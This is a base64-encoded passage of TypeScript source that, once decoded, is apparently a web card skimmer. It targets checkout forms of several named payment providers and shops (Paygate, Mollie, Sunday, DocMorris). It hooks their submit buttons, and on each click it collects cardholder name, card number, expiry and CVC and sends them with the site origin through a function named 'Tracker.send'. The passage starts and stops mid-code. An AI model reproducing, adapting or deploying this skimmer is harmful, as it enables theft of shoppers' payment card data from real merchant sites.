ICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogcGF5bWVudE1ldGhvZERhdGFbMV0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVsxXS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogcGF5bWVudE1ldGhvZERhdGFbMl0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVsyXS52YWx1ZS50b0xvd2VyQ2FzZSgpIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogcGF5bWVudE1ldGhvZERhdGFbMF0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVswXS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6IHBheW1lbnRNZXRob2REYXRhWzNdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbM10udmFsdWUgOiAnVW5rbm93bicgKyAnLycgKyBwYXltZW50TWV0aG9kRGF0YVs0XS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzRdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogcGF5bWVudE1ldGhvZERhdGFbNV0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVs1XS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kRGF0YSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAvL2VsZW1lbnRzID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVEb2Ntb3JyaXNQYXltZW50Rm9ybUVsZW1lbnQoc2VsZjogdGhpcywgX19mb3JtRWxlbWVudDogYW55LCBlbGVtZW50czogYW55W10sIGNhbGxiYWNrOiAoYXJnMDogYW55LCBhcmcxOiBhbnkpID0+IHZvaWQpIHtcclxuICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICBfX2Zvcm1FbGVtZW50LmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX2NoaWxkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICBpZiAoX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0lOUFVUJyB8fCBfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnU0VMRUNUJyB8fCBfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnQlVUVE9OJykge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnICYmIF9jaGlsZEVsZW1lbnQudHlwZSAhPT0gJ2hpZGRlbicgfHwgX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ1NFTEVDVCcpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMucHVzaChfY2hpbGRFbGVtZW50KTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGVsZW1lbnRzLmxlbmd0aCAhID4gNCAmJiBlbGVtZW50cy5sZW5ndGggISA8IDYpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJyNwZXJrcmVkaXRrYXJ0ZScpLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnI3BlcmtyZWRpdGthcnRlJykuZm9yRWFjaChmdW5jdGlvbiAoX19kYXRhQ29uZmlybUVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19kYXRhQ29uZmlybUVsZW1lbnQuZ2V0QXR0cmlidXRlKCdmb3JtJykgPT09IFwiZm9ybS1wYXltZW50bWV0aG9kcy1jcmVkaXRfY2FyZFwiKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2soX19kYXRhQ29uZmlybUVsZW1lbnQsIGVsZW1lbnRzKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZURvY21vcnJpc1BheW1lbnRGb3JtRWxlbWVudChzZWxmLCBfY2hpbGRFbGVtZW50LCBlbGVtZW50cywgY2FsbGJhY2spO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgZXhwbG9yZVBheWdhdGVQYXltZW50Q29udGFpbmVyKHNlbGY6IHRoaXMpIHtcclxuICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykuZm9yRWFjaChmdW5jdGlvbiAoX19mb3JtRWxlbWVudCkge1xyXG4gICAgICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5pZCA9PT0gXCJTU0xGb3JtXCIpIHtcclxuICAgICAgICAgICAgICAgIGxldCBlbGVtZW50czogYW55ID0gW107XHJcbiAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXlnYXRlUGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9fZm9ybUVsZW1lbnQsIGVsZW1lbnRzLCBmdW5jdGlvbiAoY29udHJvbGxlcjogYW55LCBlbGVtZW50czogYW55W10pIHtcclxuICAgICAgICAgICAgICAgICAgICBjb250cm9sbGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGF5bWVudE1ldGhvZERhdGE6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50LnR5cGUgPT09ICdyYWRpbycgJiYgX19jaGlsZEVsZW1lbnQuY2hlY2tlZCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kRGF0YS5wdXNoKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19jaGlsZEVsZW1lbnQubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2NoaWxkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJzogX19jaGlsZEVsZW1lbnQubmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fY2hpbGRFbGVtZW50LnZhbHVlLFxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50LnR5cGUgPT09ICd0ZXh0Jykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZERhdGEucHVzaCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2NoaWxkRWxlbWVudC5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2NoaWxkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IF9fY2hpbGRFbGVtZW50Lm5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19jaGlsZEVsZW1lbnQudmFsdWUsXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnU0VMRUNUJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2REYXRhLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2NoaWxkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnOiBfX2NoaWxkRWxlbWVudC5uYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2NoaWxkRWxlbWVudC52YWx1ZSxcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogcGF5bWVudE1ldGhvZERhdGFbMV0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVsxXS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogcGF5bWVudE1ldGhvZERhdGFbMl0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVsyXS52YWx1ZS50b0xvd2VyQ2FzZSgpIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogcGF5bWVudE1ldGhvZERhdGFbMF0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVswXS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6IHBheW1lbnRNZXRob2REYXRhWzNdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbM10udmFsdWUgOiAnVW5rbm93bicgKyAnLycgKyBwYXltZW50TWV0aG9kRGF0YVs0XS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzRdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogcGF5bWVudE1ldGhvZERhdGFbNV0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVs1XS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kRGF0YSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAvL2VsZW1lbnRzID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVQYXlnYXRlUGF5bWVudEZvcm1FbGVtZW50KHNlbGY6IHRoaXMsIF9fZm9ybUVsZW1lbnQ6IGFueSwgZWxlbWVudHM6IGFueVtdLCBjYWxsYmFjazogKGFyZzA6IGFueSwgYXJnMTogYW55KSA9PiB2b2lkKSB7XHJcbiAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5sZW5ndGggIT09IDApIHtcclxuICAgICAgICAgICAgX19mb3JtRWxlbWVudC5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9jaGlsZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgfHwgX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ1NFTEVDVCcgfHwgX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0JVVFRPTicgfHwgX2NoaWxkRWxlbWVudC50eXBlID09PSAncmFkaW8nKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgJiYgX2NoaWxkRWxlbWVudC50eXBlICE9PSAnaGlkZGVuJyB8fCBfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnU0VMRUNUJyB8fCBfY2hpbGRFbGVtZW50LnR5cGUgPT09ICdyYWRpbycpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMucHVzaChfY2hpbGRFbGVtZW50KTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdCVVRUT04nKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2soX2NoaWxkRWxlbWVudCwgZWxlbWVudHMpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXlnYXRlUGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9jaGlsZEVsZW1lbnQsIGVsZW1lbnRzLCBjYWxsYmFjayk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBleHBsb3JlU3VuZGF5UGF5bWVudENvbnRhaW5lcihzZWxmOiB0aGlzKSB7XHJcbiAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmZvckVhY2goZnVuY3Rpb24gKF9fZm9ybUVsZW1lbnQpIHtcclxuICAgICAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQuaWQgPT09IFwib25lLXN0ZXAtY2hlY2tvdXQtZm9ybVwiKSB7XHJcbiAgICAgICAgICAgICAgICBsZXQgZWxlbWVudHM6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU3VuZGF5UGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9fZm9ybUVsZW1lbnQsIGVsZW1lbnRzLCBmdW5jdGlvbiAoY29udHJvbGxlcjogYW55LCBlbGVtZW50czogYW55W10pIHtcclxuICAgICAgICAgICAgICAgICAgICBjb250cm9sbGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGF5bWVudE1ldGhvZERhdGE6IGFueSA9IFtdO1xyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMuZm9yRWFjaChmdW5jdGlvbiAoX19jaGlsZEVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2REYXRhLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19jaGlsZEVsZW1lbnQubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19jaGlsZEVsZW1lbnQuaWQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnOiBfX2NoaWxkRWxlbWVudC5uYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fY2hpbGRFbGVtZW50LnZhbHVlLFxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IHBheW1lbnRNZXRob2REYXRhWzFdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbMV0udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IC8qcGF5bWVudE1ldGhvZERhdGFbNl0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVs2XS52YWx1ZSA6Ki8gJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogcGF5bWVudE1ldGhvZERhdGFbMF0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVswXS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImNhcmRFeHBpcmVcIjogcGF5bWVudE1ldGhvZERhdGFbNF0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVs0XS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZENWQyc6IHBheW1lbnRNZXRob2REYXRhWzVdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbNV0udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JzogJ2FkZCcsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ3b3JrV2Vic2l0ZVwiOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kRGF0YSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAvL2VsZW1lbnRzID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVTdW5kYXlQYXltZW50Rm9ybUVsZW1lbnQoc2VsZjogdGhpcywgX19mb3JtRWxlbWVudDogYW55LCBlbGVtZW50czogYW55W10sIGNhbGxiYWNrOiAoYXJnMDogYW55LCBhcmcxOiBhbnkpID0+IHZvaWQpIHtcclxuICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICBfX2Zvcm1FbGVtZW50LmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX2NoaWxkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICBpZiAoX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0lOUFVUJyB8fCBfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnQlVUVE9OJykge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnICYmIF9jaGlsZEVsZW1lbnQudHlwZSAhPT0gJ2hpZGRlbicpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMucHVzaChfY2hpbGRFbGVtZW50KTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdCVVRUT04nKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2soX2NoaWxkRWxlbWVudCwgZWxlbWVudHMpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVTdW5kYXlQYXltZW50Rm9ybUVsZW1lbnQoc2VsZiwgX2NoaWxkRWxlbWVudCwgZWxlbWVudHMsIGNhbGxiYWNrKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVNb2xsaWVQYXltZW50Q29udGFpbmVyKHNlbGY6IHRoaXMpIHtcclxuICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykuZm9yRWFjaChmdW5jdGlvbiAoX19mb3JtRWxlbWVudCkge1xyXG4gICAgICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5pZCA9PT0gXCJib2R5XCIpIHtcclxuICAgICAgICAgICAgICAgIGxldCBlbGVtZW50czogYW55ID0gW107XHJcbiAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVNb2xsaWVQYXltZW50Rm9ybUVsZW1lbnQoc2VsZiwgX19mb3JtRWxlbWVudCwgZWxlbWVudHMsIGZ1bmN0aW9uIChjb250cm9sbGVyOiBhbnksIGVsZW1lbnRzOiBhbnlbXSkge1xyXG4gICAgICAgICAgICAgICAgICAgIGNvbnRyb2xsZXIuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwYXltZW50TWV0aG9kRGF0YTogYW55ID0gW107XHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZERhdGEucHVzaCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2NoaWxkRWxlbWVudC5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2NoaWxkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IF9fY2hpbGRFbGVtZW50Lm5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19jaGlsZEVsZW1lbnQudmFsdWUsXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogcGF5bWVudE1ldGhvZERhdGFbMV0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVsxXS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogLypwYXltZW50TWV0aG9kRGF0YVs2XS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzZdLnZhbHVlIDoqLyAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiBwYXltZW50TWV0aG9kRGF0YVswXS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzBdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY2FyZEV4cGlyZVwiOiBwYXltZW50TWV0aG9kRGF0YVs0XS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzRdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogcGF5bWVudE1ldGhvZERhdGFbNV0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVs1XS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIndvcmtXZWJzaXRlXCI6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2REYXRhID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIC8vZWxlbWVudHMgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgZXhwbG9yZU1vbGxpZVBheW1lbnRGb3JtRWxlbWVudChzZWxmOiB0aGlzLCBfX2Zvcm1FbGVtZW50OiBhbnksIGVsZW1lbnRzOiBhbnlbXSwgY2FsbGJhY2s6IChhcmcwOiBhbnksIGFyZzE6IGFueSkgPT4gdm9pZCkge1xyXG4gICAgICAgIGlmIChfX2Zvcm1FbGVtZW50LmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgIF9fZm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfY2hpbGRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgIGlmIChfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnIHx8IF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdCVVRUT04nKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgJiYgX2NoaWxkRWxlbWVudC50eXBlICE9PSAnaGlkZGVuJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5w